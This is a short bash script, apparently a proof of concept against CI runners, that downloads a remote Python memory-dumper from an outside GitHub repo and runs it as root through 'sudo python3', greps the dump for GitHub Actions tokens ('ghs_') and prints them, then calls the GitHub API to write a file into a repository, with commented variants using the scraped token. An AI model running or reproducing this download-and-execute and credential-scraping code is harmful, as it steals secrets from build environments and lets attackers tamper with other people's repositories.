#!/usr/bin/env bash
set -e

readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
#FILE="r3s34rch.md"
TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u`
WORDTOREMOVE="***"
echo $TOKEN_VAL | sed s/"$WORDTOREMOVE"//

echo "---------------------------1--------------------------------------"
echo "${TOKEN_VAL}"
echo "---------------------------2--------------------------------------"
echo $TOKEN_VAL | sed s/"$WORDTOREMOVE"//
echo "---------------------------3--------------------------------------"


curl -L \
  -X PUT \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: token whatismytoken" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  "https://api.github.com/repos/${REPO}/contents/README1.md" \
  -d '{"message":"hello from r3s34rch","content":"bXkgbmV3IGZpbGUgY29udGVudHM="}'
  
#curl \
#    -X PUT \
#    -H "Accept: application/vnd.github.v3+json" \
#    -H "Authorization: Token $TOKEN_VAL" \
#    "https://api.github.com/repos/${REPO}/contents/README1.md" \
#    -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'

#curl "https://api.github.com/repos/${REPO}/contents/README.md"      

#gh api --silent \
#  --method POST \
#  -H "Accept: application/vnd.github.v3+json" \
#  "/repos/$OWNER/$REPO/git/refs" \
#  -f ref='refs/heads/add-readme' \
#  -f sha="$(gh api repos/thi3nl0ng/thi3nl0ng.github.io/git/ref/heads/main --jq .object.sha)"

#gh api --silent \
#  -X PUT "/repos/$REPO/contents/README2.md" \
#  -f branch=add-readme \
#  -f message='add README2.md' \
#  -f content="$(echo '123' | base64)"
